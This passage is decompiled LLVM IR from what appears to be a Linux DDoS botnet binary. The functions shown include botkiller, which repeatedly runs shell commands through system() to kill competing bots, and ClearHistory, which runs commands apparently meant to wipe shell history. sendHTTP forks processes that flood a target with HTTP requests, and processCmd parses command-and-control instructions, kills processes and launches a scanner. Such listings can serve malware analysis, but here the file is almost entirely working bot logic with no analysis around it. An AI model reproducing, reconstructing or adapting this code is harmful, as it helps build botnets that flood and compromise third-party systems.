  uselistorder i32 %v1_804e7b7, { 1, 0 }
  uselistorder i32 %v15_804e789, { 1, 0 }
  uselistorder i32* %stack_var_-60, { 2, 0, 1, 4, 3 }
  uselistorder i32* %stack_var_-56, { 1, 2, 0 }
  uselistorder i32* %stack_var_-64, { 1, 2, 0, 4, 3 }
  uselistorder i8** %stack_var_-20, { 3, 1, 2, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34 }
  uselistorder i32* %eax.global-to-local, { 31, 0, 1, 2, 3, 4, 5, 6, 7, 9, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 48, 32, 33, 34, 35, 36, 37, 38, 39, 40, 42, 41, 44, 43, 45, 46, 47, 50, 49, 52, 51, 53, 54, 56, 55, 58, 57, 59, 60 }
  uselistorder i1* %cf.global-to-local, { 0, 1, 2, 3, 18, 4, 5, 7, 6, 8, 10, 9, 11, 13, 12, 14, 16, 15, 17, 38, 39, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__libc_sendto, { 2, 1, 0 }
  uselistorder i32 ()* @tcpcsum, { 1, 0 }
  uselistorder i32 ()* @makeIPPacket, { 1, 0 }
  uselistorder i32 ()* @htonl, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32)* @GetRandomIP, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__GI_setsockopt, { 2, 1, 0 }
  uselistorder i32 (i32)* @rand_cmwc, { 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %arg7, { 0, 2, 1, 3 }
  uselistorder i32 %arg6, { 2, 3, 1, 0 }
  uselistorder i8* %arg5, { 1, 0 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder i32 %arg2, { 0, 3, 1, 2 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804ed40, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_804ec57, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ebf4, { 1, 0 }
  uselistorder label %dec_label_pc_804eb8b, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804e9f1, { 1, 0 }
  uselistorder label %dec_label_pc_804e8ad, { 1, 0 }
  uselistorder label %bb90, { 1, 0 }
  uselistorder label %dec_label_pc_804e7c9, { 1, 0 }
}

define i32 @botkiller() local_unnamed_addr {
entry:
  %stack_var_-88 = alloca i32, align 4
  %v2_804ed5d = ptrtoint i32* %stack_var_-88 to i32
  %v2_804ed87 = bitcast i32* %stack_var_-88 to i8*
  br label %dec_label_pc_804ed51

dec_label_pc_804ed51:                             ; preds = %dec_label_pc_804edf5, %entry
  br label %dec_label_pc_804ed5d

dec_label_pc_804ed5d:                             ; preds = %dec_label_pc_804ed51, %dec_label_pc_804ed5d
  %storemerge8 = phi i32 [ 0, %dec_label_pc_804ed51 ], [ %v4_804ede8, %dec_label_pc_804ed5d ]
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v1_804ed76 = mul nuw nsw i32 %storemerge8, 4
  %v2_804ed76 = add i32 %v1_804ed76, ptrtoint ([87 x i8*]* @global_var_805b040.393 to i32)
  %v3_804ed76 = inttoptr i32 %v2_804ed76 to i32*
  %v4_804ed76 = load i32, i32* %v3_804ed76, align 4
  %v3_804ed87 = call i32 @strcat(i8* %v2_804ed87, i32 %v4_804ed76)
  %v1_804ed92 = call i32 @__libc_system(i32 %v2_804ed5d)
  store i32 1818848112, i32* %stack_var_-88, align 4
  %v4_804edb4 = load i32, i32* %v3_804ed76, align 4
  %v3_804edc5 = call i32 @strcat(i8* %v2_804ed87, i32 %v4_804edb4)
  %v3_804edd8 = call i32 @strcat(i8* %v2_804ed87, i32 ptrtoint (i32* @global_var_8059159.394 to i32))
  %v1_804ede3 = call i32 @__libc_system(i32 %v2_804ed5d)
  %v4_804ede8 = add nuw nsw i32 %storemerge8, 1
  %exitcond = icmp eq i32 %v4_804ede8, 9
  br i1 %exitcond, label %dec_label_pc_804edf5, label %dec_label_pc_804ed5d

dec_label_pc_804edf5:                             ; preds = %dec_label_pc_804ed5d
  %v1_804edfc = call i32 @sleep(i32 5)
  br label %dec_label_pc_804ed51

; uselistorder directives
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32* %stack_var_-88, { 1, 2, 0, 3 }
  uselistorder [3 x i8]* @global_var_8057cdb.15, { 1, 0 }
  uselistorder label %dec_label_pc_804ed5d, { 1, 0 }
}

define i32 @ClearHistory() local_unnamed_addr {
entry:
  %v2_804ee13 = call i32 @__libc_system(i32 ptrtoint ([22 x i8]* @global_var_805915b.395 to i32))
  %v2_804ee1f = call i32 @__libc_system(i32 ptrtoint ([30 x i8]* @global_var_8059171.396 to i32))
  %v2_804ee2b = call i32 @__libc_system(i32 ptrtoint ([21 x i8]* @global_var_805918f.397 to i32))
  ret i32 %v2_804ee2b

; uselistorder directives
  uselistorder i32 (i32)* @__libc_system, { 2, 1, 0, 4, 3 }
}

define i32 @sendHTTP(i32 %arg1, i32 %arg2, i16 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %stack_var_-580 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_804ee36 = load i32, i32* @esi, align 4
  %v0_804ee37 = load i32, i32* @ebx, align 4
  store i32 %v0_804ee37, i32* %stack_var_-16, align 4
  %v2_804ee48 = ptrtoint i32* %stack_var_-56 to i32
  %tmp37 = bitcast i32* %stack_var_-56 to i8*
  store i32 %v2_804ee48, i32* @edi, align 4
  store i32 ptrtoint ([7 x i8*]* @global_var_805937c.405 to i32), i32* @esi, align 4
  store i1 false, i1* @df, align 1
  %v7_804ee58 = call i8* @_memcpy(i8* %tmp37, i8* bitcast ([7 x i8*]* @global_var_805937c.405 to i8*), i32 7)
  %v2_804ee76 = call i32 @__GI_time(i32* null)
  %v5_804ee7b = add i32 %v2_804ee76, %arg5
  store i32 %v5_804ee7b, i32* @eax, align 4
  %v1_804ee81 = call i32 @random()
  %v2_804eec2 = mul i32 %v1_804ee81, -6
  store i32 %v2_804eec2, i32* @eax, align 4
  %v0_804eed0 = load i32, i32* @ebp, align 4
  %v2_804eed0 = mul i32 %v1_804ee81, -24
  %v3_804eed0 = add i32 %v2_804eed0, -52
  %v4_804eed0 = add i32 %v3_804eed0, %v0_804eed0
  %v5_804eed0 = inttoptr i32 %v4_804eed0 to i32*
  %v6_804eed0 = load i32, i32* %v5_804eed0, align 4
  store i32 %v6_804eed0, i32* @ebx, align 4
  %v1_804eed4 = call i32 @random()
  %v2_804ef02 = srem i32 %v1_804eed4, 3
  store i32 %v2_804ef02, i32* @edi, align 4
  %v2_804ef4e = ptrtoint i32* %stack_var_-580 to i32
  %v5_804ef57 = call i32 @sprintf(i32 %v2_804ef4e, i32 ptrtoint ([62 x i8]* @global_var_80593b0.409 to i32), i32 %arg2, i32 %arg4)
  %v5_804f00145 = icmp sgt i32 %arg6, 0
  br i1 %v5_804f00145, label %dec_label_pc_804ef68, label %dec_label_pc_804f007

dec_label_pc_804ef68:                             ; preds = %entry, %dec_label_pc_804eff8
  %storemerge46 = phi i32 [ %v4_804eff8, %dec_label_pc_804eff8 ], [ 0, %entry ]
  %v1_804ef68 = call i32 @__libc_fork(i32 %storemerge46)
  %v1_804ef6d = icmp eq i32 %v1_804ef68, 0
  br i1 %v1_804ef6d, label %dec_label_pc_804eff8, label %dec_label_pc_804efdb.preheader

dec_label_pc_804efdb.preheader:                   ; preds = %dec_label_pc_804ef68
  %v4_804efaa = bitcast i32* %stack_var_-580 to i8*
  br label %dec_label_pc_804efdb

dec_label_pc_804ef77:                             ; preds = %dec_label_pc_804efdb
  store i32 %arg1, i32* @edx, align 4
  %v4_804ef88 = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804ef90 = icmp eq i32 %v4_804ef88, 0
  br i1 %v4_804ef90, label %dec_label_pc_804efdb, label %dec_label_pc_804ef96

dec_label_pc_804ef96:                             ; preds = %dec_label_pc_804ef77
  store i1 false, i1* @df, align 1
  store i32 %v2_804ef4e, i32* @edi, align 4
  %v3_804efb0 = call i32 @_strlen(i8* %v4_804efaa)
  %v5_804efcb = call i32 @__libc_write(i32 %v4_804ef88, i32* nonnull %stack_var_-580, i32 %v3_804efb0)
  %v1_804efd6 = call i32 @__libc_close(i32 %v4_804ef88)
  br label %dec_label_pc_804efdb

dec_label_pc_804efdb:                             ; preds = %dec_label_pc_804ef77, %dec_label_pc_804ef96, %dec_label_pc_804efdb.preheader
  %v2_804efe2 = call i32 @__GI_time(i32* null)
  %v5_804efea = icmp slt i32 %v2_804efe2, %v5_804ee7b
  br i1 %v5_804efea, label %dec_label_pc_804ef77, label %dec_label_pc_804efec

dec_label_pc_804efec:                             ; preds = %dec_label_pc_804efdb
  %v1_804eff3 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804eff8:                             ; preds = %dec_label_pc_804ef68
  %v4_804eff8 = add nuw nsw i32 %storemerge46, 1
  %v5_804f001 = icmp slt i32 %v4_804eff8, %arg6
  br i1 %v5_804f001, label %dec_label_pc_804ef68, label %dec_label_pc_804f007

dec_label_pc_804f007:                             ; preds = %dec_label_pc_804eff8, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804eff8, %dec_label_pc_804eff8 ]
  %v2_804f00d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804f00d, i32* @ebx, align 4
  store i32 %v0_804ee36, i32* @esi, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804eff8, { 0, 2, 1 }
  uselistorder i32 %v4_804ef88, { 1, 0, 2 }
  uselistorder i32 %storemerge46, { 1, 0 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804efdb, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ef68, { 1, 0 }
}

define i32 @processCmd(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %edx.global-to-local = alloca i32, align 4
  %tmp141 = ptrtoint i32* %arg2 to i32
  %stack_var_-16 = alloca i32, align 4
  %v0_804f015 = load i32, i32* @edi, align 4
  %v0_804f016 = load i32, i32* @esi, align 4
  %v0_804f017 = load i32, i32* @ebx, align 4
  store i32 %v0_804f017, i32* %stack_var_-16, align 4
  %v5_804f018 = icmp ult i32* %stack_var_-16, inttoptr (i32 348 to i32*)
  store i1 %v5_804f018, i1* %cf.global-to-local, align 1
  %v2_804f021 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f03e = inttoptr i32 %v2_804f021 to i8*
  store i32 %v2_804f021, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8058457.21 to i32), i32* @edi, align 4
  %v7_804f050 = call i32 @_strncmp(i8* %v4_804f03e, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8058457.21, i32 0, i32 0), i32 5)
  %v8_804f050 = urem i32 %v7_804f050, 2
  %v9_804f050 = icmp eq i32 %v8_804f050, 0
  %v0_804f052 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f052 = or i1 %v0_804f052, %v9_804f050
  %v3_804f052 = zext i1 %v2_804f052 to i32
  %v4_804f052 = load i32, i32* @edx, align 4
  %v5_804f052 = and i32 %v4_804f052, -256
  %v6_804f052 = or i32 %v3_804f052, %v5_804f052
  %v7_804f052 = xor i32 %v6_804f052, 1
  store i32 %v7_804f052, i32* %edx.global-to-local, align 4
  %v1_804f05a = trunc i32 %v7_804f052 to i8
  %v3_804f05a = zext i1 %v0_804f052 to i8
  %v15_804f05a = icmp eq i8 %v1_804f05a, %v3_804f05a
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f063 = icmp eq i1 %v15_804f05a, false
  br i1 %v1_804f063, label %dec_label_pc_804f07f, label %dec_label_pc_804f065

dec_label_pc_804f065:                             ; preds = %entry
  %v0_804f065 = load i32, i32* @global_var_805b540.20, align 64
  %v2_804f075 = call i32 @sockprintf(i32 %v0_804f065, i32 ptrtoint ([6 x i8]* @global_var_80593ee.410 to i32))
  br label %dec_label_pc_804fe04

dec_label_pc_804f07f:                             ; preds = %entry
  %v2_804f082 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f09f = inttoptr i32 %v2_804f082 to i8*
  store i32 %v2_804f082, i32* @esi, align 4
  store i32 ptrtoint ([6 x i8]* @global_var_80593f4.411 to i32), i32* @edi, align 4
  %v7_804f0b1 = call i32 @_strncmp(i8* %v4_804f09f, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_80593f4.411, i32 0, i32 0), i32 6)
  %v8_804f0b1 = urem i32 %v7_804f0b1, 2
  %v9_804f0b1 = icmp eq i32 %v8_804f0b1, 0
  %v0_804f0b3 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f0b3 = or i1 %v0_804f0b3, %v9_804f0b1
  %v3_804f0b3 = zext i1 %v2_804f0b3 to i32
  %v4_804f0b3 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f0b3 = and i32 %v4_804f0b3, -256
  %v6_804f0b3 = or i32 %v3_804f0b3, %v5_804f0b3
  %v7_804f0b3 = xor i32 %v6_804f0b3, 1
  store i32 %v7_804f0b3, i32* %edx.global-to-local, align 4
  %v1_804f0bb = trunc i32 %v7_804f0b3 to i8
  %v3_804f0bb = zext i1 %v0_804f0b3 to i8
  %v15_804f0bb = icmp eq i8 %v1_804f0bb, %v3_804f0bb
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f0c4 = icmp eq i1 %v15_804f0bb, false
  br i1 %v1_804f0c4, label %dec_label_pc_804f0ea, label %dec_label_pc_804f0c6

dec_label_pc_804f0c6:                             ; preds = %dec_label_pc_804f07f
  %v0_804f0c6 = call i32 @getdtablesize()
  %v0_804f0cb = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804f0cb, i32* %edx.global-to-local, align 4
  %v2_804f0e0 = call i32 @sockprintf(i32 %v0_804f0cb, i32 ptrtoint ([3 x i8]* @global_var_80593fa.412 to i32))
  br label %dec_label_pc_804fe04

dec_label_pc_804f0ea:                             ; preds = %dec_label_pc_804f07f
  %v2_804f0ed = load i32, i32* %arg2, align 4
  %v4_804f10a = inttoptr i32 %v2_804f0ed to i8*
  %v7_804f11c = call i32 @_strncmp(i8* %v4_804f10a, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_80593fd.413, i32 0, i32 0), i32 8)
  %v8_804f11c = urem i32 %v7_804f11c, 2
  %v9_804f11c = icmp eq i32 %v8_804f11c, 0
  %v0_804f11e = load i1, i1* %cf.global-to-local, align 1
  %v2_804f11e = or i1 %v0_804f11e, %v9_804f11c
  %v3_804f11e = zext i1 %v2_804f11e to i32
  %v4_804f11e = load i32, i32* %edx.global-to-local, align 4
  %v5_804f11e = and i32 %v4_804f11e, -256
  %v6_804f11e = or i32 %v3_804f11e, %v5_804f11e
  %v7_804f11e = xor i32 %v6_804f11e, 1
  store i32 %v7_804f11e, i32* %edx.global-to-local, align 4
  %v1_804f126 = trunc i32 %v7_804f11e to i8
  %v3_804f126 = zext i1 %v0_804f11e to i8
  %v15_804f126 = icmp eq i8 %v1_804f126, %v3_804f126
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f12f = icmp eq i1 %v15_804f126, false
  br i1 %v1_804f12f, label %dec_label_pc_804f293, label %dec_label_pc_804f135

dec_label_pc_804f135:                             ; preds = %dec_label_pc_804f0ea
  %v1_804f138 = add i32 %tmp141, 4
  %v5_804f138 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804f138, i1* %cf.global-to-local, align 1
  %v1_804f13b = inttoptr i32 %v1_804f138 to i32*
  %v2_804f13b = load i32, i32* %v1_804f13b, align 4
  store i1 false, i1* @df, align 1
  %v4_804f158 = inttoptr i32 %v2_804f13b to i8*
  store i32 %v2_804f13b, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059405.414 to i32), i32* @edi, align 4
  %v7_804f16a = call i32 @_strncmp(i8* %v4_804f158, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059405.414, i32 0, i32 0), i32 4)
  %v8_804f16a = urem i32 %v7_804f16a, 2
  %v9_804f16a = icmp eq i32 %v8_804f16a, 0
  %v0_804f16c = load i1, i1* %cf.global-to-local, align 1
  %v2_804f16c = or i1 %v0_804f16c, %v9_804f16a
  %v3_804f16c = zext i1 %v2_804f16c to i32
  %v4_804f16c = load i32, i32* %edx.global-to-local, align 4
  %v5_804f16c = and i32 %v4_804f16c, -256
  %v6_804f16c = or i32 %v3_804f16c, %v5_804f16c
  %v7_804f16c = xor i32 %v6_804f16c, 1
  store i32 %v7_804f16c, i32* @edx, align 4
  %v1_804f174 = trunc i32 %v7_804f16c to i8
  %v3_804f174 = zext i1 %v0_804f16c to i8
  %v15_804f174 = icmp eq i8 %v1_804f174, %v3_804f174
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f17d = icmp eq i1 %v15_804f174, false
  br i1 %v1_804f17d, label %dec_label_pc_804f1c0, label %dec_label_pc_804f17f

dec_label_pc_804f17f:                             ; preds = %dec_label_pc_804f135
  %v0_804f17f = load i32, i32* @global_var_80617d0.415, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f184 = icmp eq i32 %v0_804f17f, 0
  br i1 %v1_804f184, label %dec_label_pc_804fe04, label %dec_label_pc_804f18c

dec_label_pc_804f18c:                             ; preds = %dec_label_pc_804f17f
  %v2_804f19c = call i32 @kill(i32 %v0_804f17f, i32 9)
  %v0_804f1a1 = load i32, i32* @global_var_805b540.20, align 64
  %v2_804f1b1 = call i32 @sockprintf(i32 %v0_804f1a1, i32 ptrtoint ([17 x i8]* @global_var_8059409.416 to i32))
  store i32 0, i32* @global_var_80617d0.415, align 16
  br label %dec_label_pc_804f1c0

dec_label_pc_804f1c0:                             ; preds = %dec_label_pc_804f135, %dec_label_pc_804f18c
  store i1 %v5_804f138, i1* %cf.global-to-local, align 1
  %v2_804f1c6 = load i32, i32* %v1_804f13b, align 4
  store i1 false, i1* @df, align 1
  %v4_804f1e3 = inttoptr i32 %v2_804f1c6 to i8*
  store i32 %v2_804f1c6, i32* @esi, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_805941a.417 to i32), i32* @edi, align 4
  %v7_804f1f5 = call i32 @_strncmp(i8* %v4_804f1e3, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_805941a.417, i32 0, i32 0), i32 3)
  %v8_804f1f5 = urem i32 %v7_804f1f5, 2
  %v9_804f1f5 = icmp eq i32 %v8_804f1f5, 0
  %v0_804f1f7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f1f7 = or i1 %v0_804f1f7, %v9_804f1f5
  %v3_804f1f7 = zext i1 %v2_804f1f7 to i32
  %v4_804f1f7 = load i32, i32* @edx, align 4
  %v5_804f1f7 = and i32 %v4_804f1f7, -256
  %v6_804f1f7 = or i32 %v3_804f1f7, %v5_804f1f7
  %v7_804f1f7 = xor i32 %v6_804f1f7, 1
  store i32 %v7_804f1f7, i32* %edx.global-to-local, align 4
  %v1_804f1ff = trunc i32 %v7_804f1f7 to i8
  %v3_804f1ff = zext i1 %v0_804f1f7 to i8
  %v15_804f1ff = icmp eq i8 %v1_804f1ff, %v3_804f1ff
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f208 = icmp eq i1 %v15_804f1ff, false
  br i1 %v1_804f208, label %dec_label_pc_804f293, label %dec_label_pc_804f20e

dec_label_pc_804f20e:                             ; preds = %dec_label_pc_804f1c0
  %v0_804f20e = load i32, i32* @global_var_80617d0.415, align 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f213 = icmp eq i32 %v0_804f20e, 0
  %v1_804f215 = icmp eq i1 %v1_804f213, false
  br i1 %v1_804f215, label %dec_label_pc_804fe04, label %dec_label_pc_804f21b

dec_label_pc_804f21b:                             ; preds = %dec_label_pc_804f20e
  %v1_804f21b = call i32 @__libc_fork(i32 3)
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804f231 = icmp eq i32 %v1_804f21b, 0
  br i1 %v4_804f231, label %dec_label_pc_804f24e, label %dec_label_pc_804f237

dec_label_pc_804f237:                             ; preds = %dec_label_pc_804f21b
  store i32 %v1_804f21b, i32* @global_var_80617d0.415, align 16
  br label %dec_label_pc_804fe04

dec_label_pc_804f24e:                             ; preds = %dec_label_pc_804f21b
  store i1 true, i1* %cf.global-to-local, align 1
  %v0_804f24e = load i32, i32* @global_var_80617c8.235, align 8
  %v1_804f256 = call i32 @__GI_inet_ntoa(i32 %v0_804f24e)
  %v0_804f25b = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804f25b, i32* %edx.global-to-local, align 4
  %v2_804f270 = call i32 @sockprintf(i32 %v0_804f25b, i32 ptrtoint ([26 x i8]* @global_var_805941d.418 to i32))
  %v2_804f282 = call i32 @StartTheLelz(i32 10, i32 1000)
  %v1_804f28e = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f293:                             ; preds = %dec_label_pc_804f1c0, %dec_label_pc_804f0ea
  %v2_804f296 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f2b3 = inttoptr i32 %v2_804f296 to i8*
  store i32 %v2_804f296, i32* @esi, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_8059437.419 to i32), i32* @edi, align 4
  %v7_804f2c5 = call i32 @_strncmp(i8* %v4_804f2b3, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_8059437.419, i32 0, i32 0), i32 8)
  %v8_804f2c5 = urem i32 %v7_804f2c5, 2
  %v9_804f2c5 = icmp eq i32 %v8_804f2c5, 0
  %v0_804f2c7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f2c7 = or i1 %v0_804f2c7, %v9_804f2c5
  %v3_804f2c7 = zext i1 %v2_804f2c7 to i32
  %v4_804f2c7 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f2c7 = and i32 %v4_804f2c7, -256
  %v6_804f2c7 = or i32 %v3_804f2c7, %v5_804f2c7
  %v7_804f2c7 = xor i32 %v6_804f2c7, 1
  store i32 %v7_804f2c7, i32* @edx, align 4
  %v1_804f2cf = trunc i32 %v7_804f2c7 to i8
  %v3_804f2cf = zext i1 %v0_804f2c7 to i8
  %v15_804f2cf = icmp eq i8 %v1_804f2cf, %v3_804f2cf
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2d8 = icmp eq i1 %v15_804f2cf, false
  br i1 %v1_804f2d8, label %dec_label_pc_804f31b, label %dec_label_pc_804f2da

dec_label_pc_804f2da:                             ; preds = %dec_label_pc_804f293
  %v0_804f2da = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f2df = icmp eq i32 %v0_804f2da, 0
  %v1_804f2e1 = icmp eq i1 %v1_804f2df, false
  br i1 %v1_804f2e1, label %dec_label_pc_804f31b, label %dec_label_pc_804f2e3

dec_label_pc_804f2e3:                             ; preds = %dec_label_pc_804f2da
  %v0_804f2e3 = load i32, i32* @global_var_80617c8.235, align 8
  %v1_804f2eb = call i32 @__GI_inet_ntoa(i32 %v0_804f2e3)
  %v0_804f2f0 = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804f2f0, i32* %edx.global-to-local, align 4
  %v2_804f305 = call i32 @sockprintf(i32 %v0_804f2f0, i32 ptrtoint ([29 x i8]* @global_var_805943f.420 to i32))
  %v0_804f30a = call i32 @botkiller()
  %v1_804f316 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804f31b:                             ; preds = %dec_label_pc_804f2da, %dec_label_pc_804f293
  %v2_804f31e = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f33b = inttoptr i32 %v2_804f31e to i8*
  store i32 %v2_804f31e, i32* @esi, align 4
  store i32 ptrtoint ([12 x i8]* @global_var_805945c.421 to i32), i32* @edi, align 4
  %v7_804f34d = call i32 @_strncmp(i8* %v4_804f33b, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @global_var_805945c.421, i32 0, i32 0), i32 12)
  %v8_804f34d = urem i32 %v7_804f34d, 2
  %v9_804f34d = icmp eq i32 %v8_804f34d, 0
  %v0_804f34f = load i1, i1* %cf.global-to-local, align 1
  %v2_804f34f = or i1 %v0_804f34f, %v9_804f34d
  %v3_804f34f = zext i1 %v2_804f34f to i32
  %v4_804f34f = load i32, i32* @edx, align 4
  %v5_804f34f = and i32 %v4_804f34f, -256
  %v6_804f34f = or i32 %v3_804f34f, %v5_804f34f
  %v7_804f34f = xor i32 %v6_804f34f, 1
  store i32 %v7_804f34f, i32* %edx.global-to-local, align 4
  %v1_804f357 = trunc i32 %v7_804f34f to i8
  %v3_804f357 = zext i1 %v0_804f34f to i8
  %v15_804f357 = icmp eq i8 %v1_804f357, %v3_804f357
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f360 = icmp eq i1 %v15_804f357, false
  br i1 %v1_804f360, label %dec_label_pc_804f38e, label %dec_label_pc_804f362

dec_label_pc_804f362:                             ; preds = %dec_label_pc_804f31b
  %v0_804f362 = load i32, i32* @global_var_80617c8.235, align 8
  %v1_804f36a = call i32 @__GI_inet_ntoa(i32 %v0_804f362)
  %v0_804f36f = load i32, i32* @global_var_805b540.20, align 64
  store i32 %v0_804f36f, i32* %edx.global-to-local, align 4
  %v2_804f384 = call i32 @sockprintf(i32 %v0_804f36f, i32 ptrtoint ([17 x i8]* @global_var_8059468.422 to i32))
  br label %dec_label_pc_804fe04

dec_label_pc_804f38e:                             ; preds = %dec_label_pc_804f31b
  %v2_804f391 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804f3ae = inttoptr i32 %v2_804f391 to i8*
  store i32 %v2_804f391, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059479.423 to i32), i32* @edi, align 4
  %v7_804f3c0 = call i32 @_strncmp(i8* %v4_804f3ae, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059479.423, i32 0, i32 0), i32 4)
  %v8_804f3c0 = urem i32 %v7_804f3c0, 2
  %v9_804f3c0 = icmp eq i32 %v8_804f3c0, 0
  %v0_804f3c2 = load i1, i1* %cf.global-to-local, align 1
  %v2_804f3c2 = or i1 %v0_804f3c2, %v9_804f3c0
  %v3_804f3c2 = zext i1 %v2_804f3c2 to i32
  %v4_804f3c2 = load i32, i32* %edx.global-to-local, align 4
  %v5_804f3c2 = and i32 %v4_804f3c2, -256
  %v6_804f3c2 = or i32 %v3_804f3c2, %v5_804f3c2
  %v7_804f3c2 = xor i32 %v6_804f3c2, 1
  store i32 %v7_804f3c2, i32* %edx.global-to-local, align 4
  %v1_804f3ca = trunc i32 %v7_804f3c2 to i8
  %v3_804f3ca = zext i1 %v0_804f3c2 to i8
  %v15_804f3ca = icmp eq i8 %v1_804f3ca, %v3_804f3ca
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804f3d3 = icmp eq i1 %v15_804f3ca, false
  br i1 %v1_804f3d3, label %dec_label_pc_804f69b, label %dec_label_pc_804f3d9

dec_label_pc_804f3d9:                             ; preds = %dec_label_pc_804f38e
  %v9_804f3d9 = icmp ult i32 %arg1, 5
  store i1 %v9_804f3d9, i1* %cf.global-to-local, align 1
  %v7_804f3dd = icmp sgt i32 %arg1, 5
  br i1 %v7_804f3dd, label %dec_label_pc_804f3e3, label %dec_label_pc_804f49c

dec_label_pc_804f3e3:                             ; preds = %dec_label_pc_804f3d9
  %v1_804f3e6 = add i32 %tmp141, 12
  %v5_804f3e6 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804f3e6, i1* %cf.global-to-local, align 1
  %v1_804f3e9 = inttoptr i32 %v1_804f3e6 to i32*
  %v2_804f3e9 = load i32, i32* %v1_804f3e9, align 4
  %v1_804f3ee = call i32 @atol(i32 %v2_804f3e9)
  %v5_804f3f3 = icmp ne i32 %v1_804f3ee, -1
  store i1 %v5_804f3f3, i1* %cf.global-to-local, align 1
  %v10_804f3f3 = icmp eq i32 %v1_804f3ee, -1
  br i1 %v10_804f3f3, label %dec_label_pc_804f49c, label %dec_label_pc_804f3fc

dec_label_pc_804f3fc:                             ; preds = %dec_label_pc_804f3e3
  %v1_804f3ff = add i32 %tmp141, 8
  %v5_804f3ff = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804f3ff, i1* %cf.global-to-local, align 1
  %v1_804f402 = inttoptr i32 %v1_804f3ff to i32*
  %v2_804f402 = load i32, i32* %v1_804f402, align 4
  %v1_804f407 = call i32 @atol(i32 %v2_804f402)
  %v5_804f40c = icmp ne i32 %v1_804f407, -1
  store i1 %v5_804f40c, i1* %cf.global-to-local, align 1
  %v10_804f40c = icmp eq i32 %v1_804f407, -1
  br i1 %v10_804f40c, label %dec_label_pc_804f49c, label %dec_label_pc_804f415

dec_label_pc_804f415:                             ; preds = %dec_label_pc_804f3fc
  %v1_804f418 = add i32 %tmp141, 16
